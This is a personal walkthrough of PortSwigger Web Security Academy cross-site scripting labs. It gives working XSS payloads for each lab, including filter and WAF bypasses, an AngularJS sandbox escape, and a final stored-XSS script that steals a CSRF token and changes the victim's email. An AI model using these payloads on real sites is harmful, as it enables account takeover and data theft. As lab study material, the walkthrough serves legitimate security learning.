# XSS

I relied HEAVILY on this [cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).

# Apprentice Labs

## **Lab: Reflected XSS into HTML context with nothing encoded**

In this lab we first get to know the idea of XSS.

The input we enter into the search bar is injected into the HTML by the server, and the new HTML is returned (or *reflected*) to the user in the response.

If we search for `demo`, we see the link that is generated is [https://0a1c005d036c64da80b9ee4e00400014.web-security-academy.net/?search=example](https://0a1c005d036c64da80b9ee4e00400014.web-security-academy.net/?search=example)

Whoever *clicks* it, will have the word *example* in their HTML.

We can inject, for example, a `<script>` tag and inside it any code we like to run on the user‚Äôs browser.

It can be code that steals cookie, or in the case of this lab, pops an alert.

Search for `<script>alert()</script>` to solve this lab.

## **Lab: Stored XSS into HTML context with nothing encoded**

This time we have another type of XSS:

The ***Stored XSS***.

Rarer and more dangerous, since the malicious script is loaded from the app‚Äôs database and 

everyone visiting the vulnerable webpage is in danger - no need to click on any link.

It can be posted, for example, in a comment section.

Everyone who enters the comment section will have the code inside the script executed in their browser.

Post a comment with `<script>alert()</script>` to solve this lab.

## **Lab: DOM XSS in `document.write` sink using source `location.search`**

*In principle, a website is vulnerable to DOM-based cross-site scripting if there is an executable path via which data can propagate from source to sink.*

Source: our input,

and sink: a javascript function that injects this input into the DOM.

The main difference between DOM XSS and Reflected XSS is that DOM XSS occurs on the browser, with vulnerable *javascript* code, and Reflected XSS occurs on the server, with *server side* vulnerable code. Of course, in the end the malicious js that was inserted to the HTML (whether by the server, as in reflected XSS, or by the client as in DOM XSS, runs on the *client‚Äôs browser*).

We can see this javascript code in the source:

```jsx
function trackSearch(query) {
		document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
	 trackSearch(query);
}
```

*trackSearch* function uses *document.write* (that‚Äôs a sink!) to take our search value (that‚Äôs a source!) and write to the DOM.

We just need to ‚Äúget out‚Äù of the **img tag** and open our very own **script tag**.

This search value:

`'">'<script>alert()</script>`

Results in:

`<img src="/resources/images/tracker.gif?searchTerms=''">` 

`<script>alert()</script>`

`'">`

We see ‚Äò‚Äù> in the html, and our script fires:)

## **Lab: DOM XSS in `innerHTML` sink using source `location.search`**

Here‚Äôs the code this time:

```jsx
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    doSearchQuery(query);
}
```

*innerHTML* injects directly into the DOM.

Searching for `<script>alert()</script>` doesn‚Äôt solve the lab:

![image.png](/assets/img/imgs-2025-07-06-XSS/image.png)

The script refuses to run inside the *<span>* tag.

We can inject the other very-famous XSS payload:

`<img src=1 onerror=alert()>`

Which tries to load an unexisting img with src=1 and when encounters an error, runs the *alert()*.

So Search for `<img src=1 onerror=alert()>` to solve the lab.

## **Lab: DOM XSS in jQuery anchor `href` attribute sink using `location.search` source**

Here, we need to make the "back" link alert `document.cookie`.

We have a **submit feedback** button, which leads to a form with jQuery source.

From <script> tag in the html:

```jsx
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
```

Currently the returnPath is `returnPath=/`.

Lets change it to `javascript:alert()`.

It‚Äôs a way to run javascript code through a link.

After changing to `/feedback?returnPath=javascript:alert()` and pressing enter,

the lab is solved:)

## **Lab: DOM XSS in jQuery selector sink using a hashchange event**

We have this script in the source:

```jsx
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```

It cuts the # from the hash in the url, and scrolls into the post using the selector.

But $() is not just a selector. It can also create  [new DOM elements](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-in-jquery)!

 So deliver this to the victim to solve the lab:

`<iframe src="https://0a7e00a703f1a069800a127200e50044.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'">`

## **Lab: Reflected XSS into attribute with angle brackets HTML-encoded**

Here, angle brackets are encoded so we can‚Äôt inject `<script>`.

But our payload is being injected not only to a `h1` but also to a value attribute:

`<input type=text placeholder='Search the blog...' name=search value="bro">`

We can escape it and create another attribute that will fire our code.

For example:

`" autofocus onfocus="alert()`

## **Lab: Stored XSS into anchor `href` attribute with double quotes HTML-encoded**

The goal here is to call the `alert` function when the author name is clicked.

The solution is simply put `javascript:alert()` as the website URL.

This is a way to run js code through a link:)

## **Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded**

We can see that our input is injected into a js script:

 `var searchTerms = 'lol';`

So we just need to break out the string, inject our `alert` and comment out the rest.

Search for  `'; alert()//`

to win:)

# Practitioner Labs

## **Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element**

We can see that we don‚Äôt have any log in or comments section.

By viewing any of the products and looking on the source, we can see this code:

```jsx
  var stores = ["London","Paris","Milan"];       
  var store = (new URLSearchParams(window.location.search)).get('storeId');               document.write('<select name="storeId">');                                
  if(store) {                                    
  document.write('<option selected>'+store+'</option>');                                }                                
```

Apperantly, we can add stores to the options by providing the new store‚Äôs name in the storeId query param.

Like [https://0a8b00230414f6e180c103ac00260024.web-security-academy.net/product?productId=3&storeId=bruh](https://0a8b00230414f6e180c103ac00260024.web-security-academy.net/product?productId=3&storeId=bruh)

The store‚Äôs name gets inserted into the html directly.

So this lab can be solved by simply providing the store name <script>alert()</script>.

## **Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded**

The goal here is once again to pop an alert.

In the home page we see a search functionality that inserts the search term in the html.

![image.png](/assets/img/imgs-2025-07-06-XSS/image%201.png)

As the name of the lab suggests, we can‚Äôt just <script>alert()</script> to win.

![◊¶◊ô◊ú◊ï◊ù ◊û◊°◊ö 2025-07-04 130709.png](/assets/img/imgs-2025-07-06-XSS/__2025-07-04_130709.png)

Apart from the lab‚Äôs name, we can see that angular js is used by simply looking at the source code.

From portswigger academy:

### *DOM XSS in AngularJS*

*If a framework like AngularJS is used, it may be possible to
 execute JavaScript without angle brackets or events. When a site uses 
the `ng-app` attribute on an HTML element, it will be 
processed by AngularJS. In this case, AngularJS will execute JavaScript 
inside double curly braces that can occur directly in HTML or inside 
attributes.*

ng-app is indeed used, so we don‚Äôt need those angle bracketsüòÑ

Let‚Äôs try maybe {{ alert() }}, the expression did disappear but no popup was showed.

The solution can be found on portswigger‚Äôs [XSS cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected), namely {{constructor.constructor('alert(1)')()}}.

## **Lab: Reflected DOM XSS**

Once again, the goal is to call `alert()`.

There is a search functionality that embeds our search term in the html.

We can see a link to a javascript file `searchResults.js` in the source code.

The search term is being rendered into `h1.innerText`, so it *seems* ok.

I wish that would work /search-results?search=javascript:alert()

Why would you EVER 

```
            eval('var searchResultsObj = ' + this.responseText);
```

When you can `var searchResultsObj = JSON.Parse(this.responseText)`?

Using eval is like the classical security error, and it basically allows us to run any code inside it.

Here, we control **searchTerm,** but the whole responseText is being injected into eval.

So first we have to see what it looks like and how we might be able to escape it.

I‚Äôll start with putting a breakpoint one line after the eval, to print the searchResultObj.

![image.png](/assets/img/imgs-2025-07-06-XSS/image%202.png)

[https://www.notion.so](https://www.notion.so)

![image.png](/assets/img/imgs-2025-07-06-XSS/image%203.png)

We control only searchTerm, but that is enough. 

We can escape the JSON by searching for:

`\"}; alert(1) //`

Which makes searchResultsObj be `{results: Array(0), searchTerm: '\\'}`

And right after the var assignment, the alert executes:)

## **Lab: Stored DOM XSS**

So this time it is stored XSS, not reflected. Thus we have comment section instead of search bar.

By looking at the source code, we can see that js file named `loadCommentsWithVulnerableEscapeHtml.js` is used (nice name BTW).

This time no eval:)

```jsx
            let comments = JSON.parse(this.responseText);
```

We have our comment injected into the html, but there is a (vulnerable) escape html function.

```jsx
if (comment.body) {
                let commentBodyPElement = document.createElement("p");
                commentBodyPElement.innerHTML = escapeHTML(comment.body);

                commentSection.appendChild(commentBodyPElement);  
  }
```

And here is the vulnerable escape function:

```jsx
		function escapeHTML(html) {
        return html.replace('<', '&lt;').replace('>', '&gt;');
    }
```

It only escapes angle brackets, but we do need angle brackets to inject <script>‚Ä¶

Something important to notice is that they use `replace` and not `replaceAll`.

`replace` only replaces the first occurence of the pattern.

So a payload like <><script>alert()</script> should work.

![image.png](/assets/img/imgs-2025-07-06-XSS/image%204.png)

Appearantly, the <script> has disappeared but it doesn‚Äôt pop.

Lets try to escape the p with:

`<></p><script>alert()</script>`

That won‚Äôt work either, because our comment is injected into <p> element directly.

After some struggle, I realized I was pretty dumb and simply used `<><img src=1 onerror="alert()"/>.`

Which worked:)

## **Lab: Reflected XSS into HTML context with most tags and attributes blocked**

So as the name suggests there is a WAF that blocks XSS attacks. 

Classic stuff like <script>print()/script> or <img src=1 onerror=print()> result in `tag is not allowed`.

We can see that also <p>, <div> and <h1> gets blocked.

However <h2> and the other h‚Äôs don‚Äôt:)

Refering to the [Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet), I took this payload:

`<h1 oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto>`

because it has no other tags in it, and only changed h1 to h2  and alert() to print().

`<h2 oncontentvisibilityautostatechange=print() style=display:block;content-visibility:auto>`

But that bad boy didn‚Äôt work, not sure why.

I tried it with 

<script>
window.location.href ="[https://0a9c00ae03c55d4d80c7032d004b0032.web-security-academy.net?search=](https://0a9c00ae03c55d4d80c7032d004b0032.web-security-academy.net/?search=)<h2 oncontentvisibilityautostatechange=print() style=display:block;content-visibility:auto>"
</script>

After some manual tweaking I decided to run the intruder to find all of the unblocked tags and attributes.

You do it by sending the request to Intruder and adding position where the tag name should be.

![image.png](/assets/img/imgs-2025-07-06-XSS/image%205.png)

In the payloads list you paste the tags‚Äô list (taken from cheatsheet):

![image.png](/assets/img/imgs-2025-07-06-XSS/image%206.png)

After doing it and something similar for the *attributes*, we see that `<body>` is not blocked, along with the attributes:

![◊¶◊ô◊ú◊ï◊ù ◊û◊°◊ö 2025-07-06 103100.png](/assets/img/imgs-2025-07-06-XSS/__2025-07-06_103100.png)

One of the few that doesnt require user interction is `onresize`.

The url we get from the cheatsheet:

[https://subdomain1.portswigger-labs.net/xss/xss.php?x=<iframe onload%3D"this.style.width%3D'1000px'" src%3D"https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D<body onresize%3Dprint()>"><%2Fiframe>&context=html](https://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Ciframe%20onload%3D%22this.style.width%3D%271000px%27%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onresize%3Dprint%28%29%3E%22%3E%3C%2Fiframe%3E&context=html)

We are going to use it in the same way.

Payload is (after replacing the src):  

<iframe onload="this.style.width='1000px'"src="[https://0ad500c503252b9480e11723001f0059.web-security-academy.net/](https://0ad500c503252b9480e11723001f0059.web-security-academy.net/)[?](https://portswigger-labs.net/xss/xss.php?x=)search=<body onresize=print()>"></iframe>

## **Lab: Reflected XSS into HTML context with all tags blocked except custom ones**

Going to cheatsheet, we can select custom tags.

![image.png](/assets/img/imgs-2025-07-06-XSS/image%207.png)

This time no attributes are blocked, so I chose the payload of **onfocusin** and delivered it as a script:

<script>
location.href = "[https://0a20001c04993c1980048037008c00ba.web-security-academy.net?search=](https://0a20001c04993c1980048037008c00ba.web-security-academy.net/?search=)<xss autofocus tabindex=1 onfocusin=alert(document.cookie)></xss>"
</script>

That it:)

## **Lab: Reflected XSS with some SVG markup allowed**

We can see here once again, that most of the tags and attributes are blocked. 

We already know that we should be looking for svg payload, and lets also use the intruder to find out what attributes are not blocked.

And we get that the `onbegin` is the only one!

The payloads for *svg animate* and *svg animatemotion* get blocked, but:

`<svg><animatetransform onbegin=alert(1) attributeName=transform>`

Works:)

## **Lab: Reflected XSS in canonical link tag**

*‚ÄúA canonical URL is the main version of a webpage chosen and prioritized by search engines like Google when duplicates exist to avoid showing repetitive content in search results.‚Äù* according to [this site.](https://www.semrush.com/blog/canonical-url-guide/)

And here is the little criminal in our lab:

<link rel="canonical" href='[https://0a2700f503ed2a3a806cbc29001400e2.web-security-academy.net/post?postId=2](https://0a2700f503ed2a3a806cbc29001400e2.web-security-academy.net/post?postId=2)'/>

We can try to inject single quote into postId, but that result in 

`"Invalid blog post ID"`

But there is another endpoint, much more forgiving:)

/post/comment/confirmation?postId=4

By using (yet again) the cheatsheet, we can see that by injecting into the connonical link the attribute *access-key* and by having the user press the access-key (which is guarented in the lab description), the link will be used.

[https://0a2700f503ed2a3a806cbc29001400e2.web-security-academy.net/post/comment/confirmation?postId=4'accesskey='x'onclick='alert()](https://0a2700f503ed2a3a806cbc29001400e2.web-security-academy.net/post/comment/confirmation?postId=4%27accesskey=%27x%27onclick=%27alert())

Pressing Alt+X fires alert.

BUT they asked for alert in the home page.

So by some tweaks we can get the link:

[https://0a2700f503ed2a3a806cbc29001400e2.web-security-academy.net/?'accesskey='x'onclick='alert()](https://0a2700f503ed2a3a806cbc29001400e2.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert())

Which is a solution:)

## **Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped**

This script looks strange:

```jsx
var searchTerms = 'hi';

document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">')
```

The `document.write` may look like DOM XSS, but the actuall injection is in the `searchTerms` variable (the `encodeURIComponent` pretty much prevents XSS).

Anyway, if we try to inject stuff into the input, we see that **angle brackets** and **quotes** are escaped before put into the h1.

However, the little strange script produces interesting results:

![image.png](/assets/img/imgs-2025-07-06-XSS/image%208.png)

So </script> actually breaks from the current <script> block.

I tried to use the payload `</script></script>alert();`, but that didn‚Äôt work because of syntex errors created. 

By commenting out the rest of the string, we can get the alert:)

`</script><script>alert();//`

## **Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped**

We once again have this little strange script:

```jsx
var searchTerms = 'lol';            
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
```

Trying the previous payload wouldn‚Äôt work because the angle brackets are encoded this time in the javascript.

But backslashes are not escaped:)

`\';alert(); //`

Which give us:

`var searchTerms = '\\';alert()';`

The single quote is being escaped, and the backslash we inserted is the one that ‚Äútakes‚Äù the escape.

Than our alert gets in and pops!

## **Lab: Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped**

After posting a comment on one of the posts, we can see that the **website** is being injected into a strange js code inside *onclick*:

```jsx
onclick="var tracker={track(){}};tracker.track('http://google.com');"
```

We need alert to pop when the author name is pressed.

I tried to put `javascript:alert()` into the website but appearantly it gets blocked.

Because both single quote and  backslash are being escaped, there is a technique that might help us here: using [html encoding](https://portswigger.net/web-security/cross-site-scripting/contexts#making-use-of-html-encoding).

So we can use https://google.com/&apos;-alert()-&apos; as website.

Basically, the html decodes the &apos; so it becomes a single quote when the javascript fires.

## **Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped**

[https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-javascript-template-literals](https://portswigger.net/web-security/cross-site-scripting/contexts#xss-in-javascript-template-literals)

Template literals are such a beast.

Simple `${alert()}` solves the lab.

No injection, no escaping.

## **Lab: Exploiting XSS to bypass CSRF defenses**

**Cross-Site Request Forgery (CSRF)** is an attack that tricks a user into performing unwanted actions on a web application where they are authenticated, typically by clicking a malicious link or unknowingly sending a forged request.

We don‚Äôt actually need the user‚Äôs CSRF token to solve this lab. 

We need to create a script that exifltrate it and changes the user‚Äôs email.

No defenses: even <script>alert(1)</script> works.

Same CSRF token exists in the update email and post comment.

```html
<script>
(async () => {
const URL = "https://0a96000d03a8608d805ba3c3005100c8.web-security-academy.net";
const response = await fetch(URL+"/my-account")
const text = await response.text();
const parser = new DOMParser();
const doc = parser.parseFromString(text, 'text/html');
const csrf = doc.querySelector('input[name="csrf"]').value;
alert(csrf);
})();
</script>
```

This code, when posted in a comment, does alert our crsf token.

So we can now make a nice post request as well, to change an email using the csrf token.

Using Burp proxy, we can see that the `POST /my-account/change-email` request has the data:

email=a%[40a.com](http://40a.com/)&csrf=IPmC0rHfq2fvVYTHne4MNFEfMiByavwT.

```html
<script>
(async () => {
const URL = "https://0a96000d03a8608d805ba3c3005100c8.web-security-academy.net";
const response = await fetch(URL+"/my-account")
const text = await response.text();
const parser = new DOMParser();
const doc = parser.parseFromString(text, 'text/html');
const csrf = doc.querySelector('input[name="csrf"]').value;
const data = "email=c%40c.com&csrf="+csrf;

fetch(URL+"/my-account/change-email", {
	method: "POST",
	headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  },
  body: data
});
})();
</script>
```

And that should be it, now just post it as comment and lab is solved.
